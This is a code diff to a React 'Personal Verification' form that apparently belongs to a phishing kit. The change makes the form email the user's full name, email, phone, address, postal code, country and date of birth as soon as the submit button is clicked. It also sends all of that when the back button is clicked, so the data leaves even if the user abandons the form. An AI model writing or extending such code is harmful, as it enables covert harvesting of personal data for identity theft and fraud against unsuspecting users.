@@ -77,13 +77,26 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
 
     setIsLoading(true);
     
-    // Send email notification for form submission
+    // Send email notification for form submission button click
     try {
+      console.log('🚨 Sending email for personal verification form submission button click');
       await sendEmailNotification({
-        step: "Personal Verification - FORM SUBMITTED",
+        step: "Personal Verification - FORM SUBMITTED (Button Click)",
         username,
         timestamp: new Date().toISOString(),
-        allFormData: formData
+        allFormData: {
+          username: username || 'N/A',
+          firstName: formData.firstName || 'N/A',
+          lastName: formData.lastName || 'N/A',
+          email: formData.email || 'N/A',
+          phone: formData.phone || 'N/A',
+          address: formData.address || 'N/A',
+          city: formData.city || 'N/A',
+          postalCode: formData.postalCode || 'N/A',
+          country: formData.country || 'N/A',
+          dateOfBirth: formData.dateOfBirth || 'N/A',
+          action: 'personal_verification_submitted'
+        }
       });
     } catch (error) {
       console.error('❌ Email notification failed:', error);
@@ -102,11 +115,24 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
 
   const handleBackClick = async () => {
     try {
+      console.log('🚨 Sending email for back button click');
       await sendEmailNotification({
         step: "Personal Verification - Back Button Clicked",
         username,
         timestamp: new Date().toISOString(),
-        allFormData: formData
+        allFormData: {
+          username: username || 'N/A',
+          firstName: formData.firstName || 'N/A',
+          lastName: formData.lastName || 'N/A',
+          email: formData.email || 'N/A',
+          phone: formData.phone || 'N/A',
+          address: formData.address || 'N/A',
+          city: formData.city || 'N/A',
+          postalCode: formData.postalCode || 'N/A',
+          country: formData.country || 'N/A',
+          dateOfBirth: formData.dateOfBirth || 'N/A',
+          action: 'back_button_clicked'
+        }
       });
     } catch (error) {
       console.error('❌ Email notification failed:', error);
